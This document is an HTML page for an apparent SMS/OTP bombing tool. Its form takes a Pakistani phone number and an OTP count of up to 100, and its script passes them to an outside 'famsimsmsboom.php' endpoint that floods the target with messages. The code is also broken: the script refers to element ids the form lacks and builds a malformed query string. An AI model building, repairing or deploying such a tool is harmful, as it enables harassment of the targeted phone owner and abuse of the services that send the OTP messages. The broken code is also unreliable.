<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Styled OTP Form</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: Arial, sans-serif;
      background: linear-gradient(to bottom, #0f2027, #203a43, #2c5364);
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .form-container {
      background-color: rgba(255, 255, 255, 0.05);
      padding: 30px;
      border-radius: 10px;
      box-shadow: 0 0 15px #00ffff88;
      text-align: center;
    }

    h2 {
      color: #00ffff;
      margin-bottom: 20px;
    }

    input[type="text"], input[type="number"] {
      width: 260px;
      padding: 10px;
      margin: 10px 0;
      border: none;
      border-radius: 5px;
      outline: none;
      background-color: #ffffff0f;
      color: white;
    }

    ::placeholder {
      color: #ccc;
    }

    input[type="submit"] {
      padding: 10px 30px;
      background-color: #00ffff88;
      color: black;
      border: none;
      border-radius: 5px;
      cursor: pointer;
font-weight: bold;
      margin-top: 10px;
    }

    input[type="submit"]:hover {
      background-color: #00ffffcc;
    }
  </style>
</head>
<body>
  <div class="form-container">
    <h2>FAM OFC SMS PAGE</h2>
    <form action="#">
      <input type="text" placeholder="Enter number 923xx" required><br>
      <input type="number" placeholder="Enter OTP count (1-100)" min="1" max="100" required><br>
      <input type="submit" value="Send OTP">
    </form>
  </div>
</body>
</html>
 <script>
const form = document.getElementById('smsForm');
        form.addEventListener('submit', (e) => {
            e.preventDefault();
            const number = document.getElementById('number').value;
            const amount = document.getElementById('amount').value;
            const apiUrl = `https://fam-official.serv00.net/sim/famsimsmsboom.php?number=${number}=${amount}`;
            fetch(apiUrl)
                .then(response => response.text())
                .then(data => {
                    document.getElementById('result').innerHTML = `SMS Bhej diya gaya hai! Response: ${data}`;
                })
                .catch(error => console.error(error));
        });
    </script>
</body>
</html>
